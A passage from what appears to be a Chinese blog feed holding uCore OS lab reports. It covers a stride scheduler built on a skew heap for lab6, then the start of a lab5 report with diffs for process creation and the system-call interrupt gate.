a-&gt;left = l;</span><br><span class="line">          a-&gt;right = r;</span><br><span class="line">          <span class="keyword">if</span> (l) l-&gt;parent = a;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> a;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">          r = b-&gt;left;</span><br><span class="line">          l = skew_heap_merge(a, b-&gt;right, comp);</span><br><span class="line">          </span><br><span class="line">          b-&gt;left = l;</span><br><span class="line">          b-&gt;right = r;</span><br><span class="line">          <span class="keyword">if</span> (l) l-&gt;parent = b;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> b;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">skew_heap_entry_t</span> *</span><br><span class="line">skew_heap_insert(<span class="keyword">skew_heap_entry_t</span> *a, <span class="keyword">skew_heap_entry_t</span> *b,</span><br><span class="line">                 compare_f comp)</span><br><span class="line">&#123;</span><br><span class="line">     skew_heap_init(b);</span><br><span class="line">     <span class="keyword">return</span> skew_heap_merge(a, b, comp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">skew_heap_entry_t</span> *</span><br><span class="line">skew_heap_remove(<span class="keyword">skew_heap_entry_t</span> *a, <span class="keyword">skew_heap_entry_t</span> *b,</span><br><span class="line">                 compare_f comp)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">skew_heap_entry_t</span> *p   = b-&gt;parent;</span><br><span class="line">     <span class="keyword">skew_heap_entry_t</span> *rep = skew_heap_merge(b-&gt;left, b-&gt;right, comp);</span><br><span class="line">     <span class="keyword">if</span> (rep) rep-&gt;parent = p;</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">if</span> (p)</span><br><span class="line">     &#123;</span><br><span class="line">          <span class="keyword">if</span> (p-&gt;left == b)</span><br><span class="line">               p-&gt;left = rep;</span><br><span class="line">          <span class="keyword">else</span> p-&gt;right = rep;</span><br><span class="line">          <span class="keyword">return</span> a;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">return</span> rep;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>    <span class="comment">/* !__LIBS_SKEW_HEAP_H__ */</span></span></span><br></pre></td></tr></table></figure></div>
<p>对default_sched_stride_c文件进行修改，依照default_sched.c对各函数进行仿写补充</p>
<p> <strong>proc_stride_comp_f</strong>函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;defs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;proc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;default_sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USE_SKEW_HEAP 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* You should define the BigStride constant here*/</span></span><br><span class="line"><span class="comment">/* LAB6: YOUR CODE */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIG_STRIDE    0x3f3f3f3f  <span class="comment">/* you should give a value, and is ??? */</span> <span class="comment">/* 定义一个大整数处以优先级 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The compare function for two skew_heap_node_t's and the</span></span><br><span class="line"><span class="comment"> * corresponding procs*/</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">proc_stride_comp_f(<span class="keyword">void</span> *a, <span class="keyword">void</span> *b)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">p</span> = <span class="title">le2proc</span>(<span class="title">a</span>, <span class="title">lab6_run_pool</span>);</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">q</span> = <span class="title">le2proc</span>(<span class="title">b</span>, <span class="title">lab6_run_pool</span>);</span></span><br><span class="line">     <span class="keyword">int32_t</span> c = p-&gt;lab6_stride - q-&gt;lab6_stride;</span><br><span class="line">     <span class="keyword">if</span> (c &gt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>stride_init</strong>函数</p>
<p>首先初始化调度器类的信息，初始化运行队列为一个空的容器结构，然后设置当前运行队列内进程数目为0</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stride_init initializes the run-queue rq with correct assignment for</span></span><br><span class="line"><span class="comment"> * member variables, including:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   - run_list: should be a empty list after initialization.</span></span><br><span class="line"><span class="comment"> *   - lab6_run_pool: NULL</span></span><br><span class="line"><span class="comment"> *   - proc_num: 0</span></span><br><span class="line"><span class="comment"> *   - max_time_slice: no need here, the variable would be assigned by the caller.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * hint: see libs/list.h for routines of the list structures.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stride_init(struct run_queue *rq) &#123;</span><br><span class="line">     <span class="comment">/* LAB6: YOUR CODE </span></span><br><span class="line"><span class="comment">      * (1) init the ready process list: rq-&gt;run_list</span></span><br><span class="line"><span class="comment">      * (2) init the run pool: rq-&gt;lab6_run_pool</span></span><br><span class="line"><span class="comment">      * (3) set number of process: rq-&gt;proc_num to 0       </span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="comment">//与RR算法差异，增加容器元素</span></span><br><span class="line">      list_init(&amp;(rq-&gt;run_list));<span class="comment">//初始化调度器类的信息</span></span><br><span class="line">      rq-&gt;lab6_run_pool = <span class="literal">NULL</span>;<span class="comment">//初始化当前的运行队列为一个空的容器结构</span></span><br><span class="line">      rq-&gt;proc_num = <span class="number">0</span>;<span class="comment">//设置rq-&gt;proc_num为 0  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>stride_enqueue</strong>函数</p>
<p>初始化刚进入运行队列的进程proc的stride属性。 比较队头元素(队头即为最小堆的最小值元素)与当前进程的步数大小，选择步数最小的运行，将proc插入放入运行队列中去（注意：这里并不要求放置在队列头部）。 最后初始化时间片，然后将运行队列进程数目加一。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stride_enqueue inserts the process ``proc'' into the run-queue</span></span><br><span class="line"><span class="comment"> * ``rq''. The procedure should verify/initialize the relevant members</span></span><br><span class="line"><span class="comment"> * of ``proc'', and then put the ``lab6_run_pool'' node into the</span></span><br><span class="line"><span class="comment"> * queue(since we use priority queue here). The procedure should also</span></span><br><span class="line"><span class="comment"> * update the meta date in ``rq'' structure.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * proc-&gt;time_slice denotes the time slices allocation for the</span></span><br><span class="line"><span class="comment"> * process, which should set to rq-&gt;max_time_slice.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * hint: see libs/skew_heap.h for routines of the priority</span></span><br><span class="line"><span class="comment"> * queue structures.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stride_enqueue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">     <span class="comment">/* LAB6: YOUR CODE </span></span><br><span class="line"><span class="comment">      * (1) insert the proc into rq correctly</span></span><br><span class="line"><span class="comment">      * NOTICE: you can use skew_heap or list. Important functions</span></span><br><span class="line"><span class="comment">      *         skew_heap_insert: insert a entry into skew_heap</span></span><br><span class="line"><span class="comment">      *         list_add_before: insert  a entry into the last of list   </span></span><br><span class="line"><span class="comment">      * (2) recalculate proc-&gt;time_slice</span></span><br><span class="line"><span class="comment">      * (3) set proc-&gt;rq pointer to rq</span></span><br><span class="line"><span class="comment">      * (4) increase rq-&gt;proc_num</span></span><br><span class="line"><span class="comment">      */</span> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_SKEW_HEAP  </span></span><br><span class="line">    <span class="comment">//在使用优先队列的实现中表示当前优先队列的头元素</span></span><br><span class="line">    rq-&gt;lab6_run_pool = skew_heap_insert(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);</span><br><span class="line">    <span class="comment">//比较队头元素与当前进程的步数大小，选择步数最小的运行  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  </span></span><br><span class="line">    assert(list_empty(&amp;(proc-&gt;run_link)));  </span><br><span class="line">    list_add_before(&amp;(rq-&gt;run_list), &amp;(proc-&gt;run_link));<span class="comment">//将 proc插入放入运行队列中去  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) &#123;<span class="comment">//初始化时间片  </span></span><br><span class="line">        proc-&gt;time_slice = rq-&gt;max_time_slice;  </span><br><span class="line">    &#125;  </span><br><span class="line">    proc-&gt;rq = rq;  </span><br><span class="line">    rq-&gt;proc_num ++;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>stride_dequeue</strong>函数</p>
<p>从运行队列中删除相应的元素,完成将一个进程从队列中移除的功能,使用优先队列。最后运行队列数目减一。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stride_dequeue removes the process ``proc'' from the run-queue</span></span><br><span class="line"><span class="comment"> * ``rq'', the operation would be finished by the skew_heap_remove</span></span><br><span class="line"><span class="comment"> * operations. Remember to update the ``rq'' structure.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * hint: see libs/skew_heap.h for routines of the priority</span></span><br><span class="line"><span class="comment"> * queue structures.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stride_dequeue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">     <span class="comment">/* LAB6: YOUR CODE </span></span><br><span class="line"><span class="comment">      * (1) remove the proc from rq correctly</span></span><br><span class="line"><span class="comment">      * NOTICE: you can use skew_heap or list. Important functions</span></span><br><span class="line"><span class="comment">      *         skew_heap_remove: remove a entry from skew_heap</span></span><br><span class="line"><span class="comment">      *         list_del_init: remove a entry from the  list</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_SKEW_HEAP  </span></span><br><span class="line">     rq-&gt;lab6_run_pool =   </span><br><span class="line">     skew_heap_remove(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);<span class="comment">// 在斜堆中删除相应元素 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  </span></span><br><span class="line">     assert(!list_empty(&amp;(proc-&gt;run_link)) &amp;&amp; proc-&gt;rq == rq);  </span><br><span class="line">     list_del_init(&amp;(proc-&gt;run_link));<span class="comment">// 从运行队列中删除相应元素  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">     rq-&gt;proc_num --;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>stride_pick_next</strong>函数</p>
<p>扫描整个运行队列，返回其中stride值最小的对应进程。 </p>
<p>更新对应进程的stride值，即pass = BIG_STRIDE / P-&gt;priority; P-&gt;stride += pass。将步长设置为优先级的倒数，如果为0则设置为最大的步长。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stride_pick_next pick the element from the ``run-queue'', with the</span></span><br><span class="line"><span class="comment"> * minimum value of stride, and returns the corresponding process</span></span><br><span class="line"><span class="comment"> * pointer. The process pointer would be calculated by macro le2proc,</span></span><br><span class="line"><span class="comment"> * see kern/process/proc.h for definition. Return NULL if</span></span><br><span class="line"><span class="comment"> * there is no process in the queue.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * When one proc structure is selected, remember to update the stride</span></span><br><span class="line"><span class="comment"> * property of the proc. (stride += BIG_STRIDE / priority)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * hint: see libs/skew_heap.h for routines of the priority</span></span><br><span class="line"><span class="comment"> * queue structures.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">stride_pick_next</span>(<span class="title">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>) &#123;</span></span><br><span class="line">     <span class="comment">/* LAB6: YOUR CODE </span></span><br><span class="line"><span class="comment">      * (1) get a  proc_struct pointer p  with the minimum value of stride</span></span><br><span class="line"><span class="comment">             (1.1) If using skew_heap, we can use le2proc get the p from rq-&gt;lab6_run_poll</span></span><br><span class="line"><span class="comment">             (1.2) If using list, we have to search list to find the p with minimum stride value</span></span><br><span class="line"><span class="comment">      * (2) update p;s stride value: p-&gt;lab6_stride</span></span><br><span class="line"><span class="comment">      * (3) return p</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_SKEW_HEAP  </span></span><br><span class="line">    <span class="keyword">if</span> (rq-&gt;lab6_run_pool == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//找到相应指针指向rq-&gt;lab6_run_pool</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">p</span> = <span class="title">le2proc</span>(<span class="title">rq</span>-&gt;<span class="title">lab6_run_pool</span>, <span class="title">lab6_run_pool</span>);</span>   </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  </span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_next(&amp;(rq-&gt;run_list));  </span><br><span class="line">    <span class="keyword">if</span> (le == &amp;rq-&gt;run_list) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">p</span> = <span class="title">le2proc</span>(<span class="title">le</span>, <span class="title">run_link</span>);</span>  </span><br><span class="line">    le = list_next(le);  </span><br><span class="line">    <span class="keyword">while</span> (le != &amp;rq-&gt;run_list)  &#123;  </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">q</span> = <span class="title">le2proc</span>(<span class="title">le</span>, <span class="title">run_link</span>);</span>  </span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">int32_t</span>)(p-&gt;lab6_stride - q-&gt;lab6_stride) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            p = q;  </span><br><span class="line">        &#125;</span><br><span class="line">        le = list_next(le);  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;lab6_priority == <span class="number">0</span>) &#123; <span class="comment">//优先级设置</span></span><br><span class="line">        <span class="comment">//步长为0则设置为最大步长保持相减的有效性 </span></span><br><span class="line">        p-&gt;lab6_stride += BIG_STRIDE;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//步长设置为优先级的倒数  </span></span><br><span class="line">        p-&gt;lab6_stride += BIG_STRIDE / p-&gt;lab6_priority;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>stride_proc_tick</strong>函数</p>
<p>检测当前进程是否已用完分配的时间片。如果时间片用完，应该正确设置进程结构的相关标记来引起进程切换。 一个进程最多可以连续运行 rq.max_time_slice个时间片。 具体思想同RR算法思想，该部分代码和RR算法完全相同</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stride_proc_tick works with the tick event of current process. You</span></span><br><span class="line"><span class="comment"> * should check whether the time slices for current process is </span></span><br><span class="line"><span class="comment"> * exhausted and update the proc struct ``proc''. proc-&gt;time_slice</span></span><br><span class="line"><span class="comment"> * denotes the time slices left for current</span></span><br><span class="line"><span class="comment"> * process. proc-&gt;need_resched is the flag variable for process</span></span><br><span class="line"><span class="comment"> * switching.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stride_proc_tick(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">     <span class="comment">/* LAB6: YOUR CODE */</span></span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        proc-&gt;time_slice --;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span>) &#123;<span class="comment">//时间片为0说明需要被重新分配调度</span></span><br><span class="line">        proc-&gt;need_resched = <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>stride_sched_class</strong></p>
<p>定义一个c语言类的实现，提供调度算法的切换接口，这里将原来的default_sched_class改为stride_sched_class</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> <span class="title">stride_sched_class</span> = &#123;</span></span><br><span class="line">     .name = <span class="string">"stride_scheduler"</span>,</span><br><span class="line">     .init = stride_init,</span><br><span class="line">     .enqueue = stride_enqueue,</span><br><span class="line">     .dequeue = stride_dequeue,</span><br><span class="line">     .pick_next = stride_pick_next,</span><br><span class="line">     .proc_tick = stride_proc_tick,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>替换调用接口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">cp default_sched_stride_c default_sched_stride.c</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">default_sched.h</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __KERN_SCHEDULE_SCHED_RR_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __KERN_SCHEDULE_SCHED_RR_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//extern struct sched_class default_sched_class;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> <span class="title">stride_sched_class</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !__KERN_SCHEDULE_SCHED_RR_H__ */</span></span></span><br><span class="line"></span><br><span class="line">sched.c</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">sched_init(<span class="keyword">void</span>) &#123;</span><br><span class="line">    list_init(&amp;timer_list);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sched_class = &amp;default_sched_class;</span></span><br><span class="line">    sched_class = &amp;stride_sched_class;</span><br><span class="line"></span><br><span class="line">    rq = &amp;__rq;</span><br><span class="line">    rq-&gt;max_time_slice = MAX_TIME_SLICE;</span><br><span class="line">    sched_class-&gt;init(rq);</span><br><span class="line"></span><br><span class="line">    cprintf(<span class="string">"sched class: %s\n"</span>, sched_class-&gt;name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>测试代码</p>
<p>make run-priority</p>
<p><img src="/images/loading.gif" data-original="/posts/48714bfd/image-20200502192701147.png" alt="image-20200502192701147"></p>
<p>make grade</p>
<p><img src="/images/loading.gif" data-original="/posts/48714bfd/image-20200502192546643.png" alt="image-20200502192546643"></p>
<p>测试通过</p>
<p>如果测验未能通过，问题可能出现在MAX_TIME_SLICE上，这个MAX_TIME_SLICE的值有时候能通过priority测验，有时候却不行，如果不行的话，可以将<code>sched.h</code>的MAX_TIME_SLICE的值进行调节（例如把20改成5）看是否能通过测验。</p>
<h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><p>​         本次实验的主要知识点在于对处理机调度算法的掌握和理解，这次试验我了解了时间中断的具体实现方法，即是用计数器循环减一来实现的。通过此次实验我了解了Round Robin调度算法 和 Stride Scheduling 调度算法的具体实现方法，对课上的知识有了更深的理解和掌握。</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>uCoreOs lab5 实验报告</title>
    <url>/posts/c606d982/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ul>
<li>了解第一个用户进程创建过程</li>
<li>了解系统调用框架的实现机制</li>
<li>了解ucore如何实现系统调用sys_fork/sys_exec/sys_exit/sys_wait来进行进程管理<a id="more"></a></li>
</ul>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><h2 id="练习0：填写已有实验"><a href="#练习0：填写已有实验" class="headerlink" title="练习0：填写已有实验"></a>练习0：填写已有实验</h2><p>本实验依赖实验1/2/3/4。请把你做的实验1/2/3/4的代码填入本实验中代码中有“LAB1”/“LAB2”/“LAB3”/“LAB4”的注释相应部分。注意：为了能够正确执行lab5的测试应用程序，可能需对已完成的实验1/2/3/4的代码进行进一步改进。</p>
<p>最麻烦的一部分</p>
<p>要修改的文件有<code>proc.c default_pmm.c pmm.c swap_fifo.c vmm.c trap.c kdebug.c</code></p>
<p>另外，有部分需要在原代码基础上增添新内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">proc.c</span><br><span class="line">     <span class="comment">//LAB5 YOUR CODE : (update LAB4 steps)</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * below fields(add in LAB5) in proc_struct need to be initialized	</span></span><br><span class="line"><span class="comment">     *       uint32_t wait_state;                        // waiting state</span></span><br><span class="line"><span class="comment">     *       struct proc_struct *cptr, *yptr, *optr;     // relations between processes</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">+	proc-&gt;wait_state = <span class="number">0</span>;</span><br><span class="line">+	proc-&gt;cptr = proc-&gt;optr = proc-&gt;yptr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">default_pmm.c</span><br><span class="line">	<span class="comment">//LAB5 YOUR CODE : (update LAB4 steps)</span></span><br><span class="line">   <span class="comment">/* Some Functions</span></span><br><span class="line"><span class="comment">    *    set_links:  set the relation links of process.  ALSO SEE: remove_links:  lean the relation links of process </span></span><br><span class="line"><span class="comment">    *    -------------------</span></span><br><span class="line"><span class="comment">	*    update step 1: set child proc's parent to current process, make sure current process's wait_state is 0</span></span><br><span class="line"><span class="comment">	*    update step 5: insert proc_struct into hash_list &amp;&amp; proc_list, set the relation links of process</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//    1. call alloc_proc to allocate a proc_struct</span></span><br><span class="line">    proc = alloc_proc();</span><br><span class="line">    <span class="keyword">if</span> (!proc) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    proc-&gt;parent = current;</span><br><span class="line">+   assert(current-&gt;wait_state == <span class="number">0</span>);<span class="comment">//确保当前进程正在等待</span></span><br><span class="line">    <span class="comment">//    2. call setup_kstack to allocate a kernel stack for child process</span></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//    3. call copy_mm to dup OR share mm according clone_flag</span></span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//    4. call copy_thread to setup tf &amp; context in proc_struct</span></span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf);</span><br><span class="line">    <span class="comment">//    5. insert proc_struct into hash_list &amp;&amp; proc_list</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    proc-&gt;pid = get_pid();</span><br><span class="line">-   <span class="comment">//list_add(&amp;proc_list, &amp;proc-&gt;list_link);</span></span><br><span class="line">    hash_proc(proc);</span><br><span class="line">-   <span class="comment">//++nr_process;</span></span><br><span class="line">+   set_links(proc);</span><br><span class="line">    <span class="comment">//将原来简单的计数改成来执行set_links函数，从而实现设置进程的相关链接 </span></span><br><span class="line">    <span class="comment">//因为要涉及到进程的调度 </span></span><br><span class="line">    <span class="comment">//在set_links中包含了list_add和set_links操作</span></span><br><span class="line">    <span class="comment">//set_links函数在proc.c（145）中</span></span><br><span class="line">    <span class="comment">// set_links - set the relation links of process</span></span><br><span class="line">    <span class="comment">//static void</span></span><br><span class="line">    <span class="comment">//set_links(struct proc_struct *proc) &#123;</span></span><br><span class="line">    <span class="comment">//    list_add(&amp;proc_list, &amp;(proc-&gt;list_link));</span></span><br><span class="line">    <span class="comment">//    proc-&gt;yptr = NULL;</span></span><br><span class="line">    <span class="comment">//    if ((proc-&gt;optr = proc-&gt;parent-&gt;cptr) != NULL) &#123;</span></span><br><span class="line">    <span class="comment">//        proc-&gt;optr-&gt;yptr = proc;</span></span><br><span class="line">    <span class="comment">//    &#125;</span></span><br><span class="line">    <span class="comment">//    proc-&gt;parent-&gt;cptr = proc;</span></span><br><span class="line">    <span class="comment">//    nr_process ++;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    <span class="comment">//    6. call wakeup_proc to make the new child process RUNNABLE</span></span><br><span class="line">    wakeup_proc(proc);</span><br><span class="line">    <span class="comment">//    7. set ret vaule using child proc's pid</span></span><br><span class="line">    ret = proc-&gt;pid;</span><br><span class="line"></span><br><span class="line">trap.c</span><br><span class="line">    </span><br><span class="line">     <span class="comment">/* LAB5 YOUR CODE */</span> </span><br><span class="line">     <span class="comment">//you should update your lab1 code (just add ONE or TWO lines of code), let user app to use syscall to get the service of ucore</span></span><br><span class="line">     <span class="comment">//so you should setup the syscall interrupt gate in here</span></span><br><span class="line">	    <span class="keyword">extern</span> <span class="keyword">uintptr_t</span> __vectors[];</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;  i &lt; <span class="number">256</span>; i ++)&#123;</span><br><span class="line">                SETGATE(idt[i], <span class="number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);</span><br><span class="line">        &#125;</span><br><span class="line">-       <span class="comment">//SETGATE(idt[T_SWITCH_TOK], 0, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER);</span></span><br><span class="line">+       SETGATE(idt[T_SYSCALL], <span class="number">1</span>, GD_KTEXT, __vectors[T_SYSCALL], DPL_USER);</span><br><span class="line">	    <span 